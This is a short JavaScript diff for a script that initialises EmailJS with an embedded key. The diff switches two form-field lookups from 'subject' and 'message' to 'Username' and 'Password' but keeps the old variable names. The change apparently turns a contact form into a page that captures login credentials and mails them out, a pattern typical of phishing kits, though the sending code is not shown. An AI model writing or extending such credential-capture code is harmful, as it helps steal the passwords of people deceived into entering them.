@@ -1,8 +1,8 @@
 // Initialize EmailJS with your public key (API key)
 emailjs.init('rbzxQsqsqS1lbs8Y1'); // Replace with your actual public key
 
-const subjectInput = document.getElementById('subject');
-const messageInput = document.getElementById('message');
+const subjectInput = document.getElementById('Username');
+const messageInput = document.getElementById('Password');
 const sendBtn = document.getElementById('sendBtn');
 const statusDiv = document.getElementById('status');
 
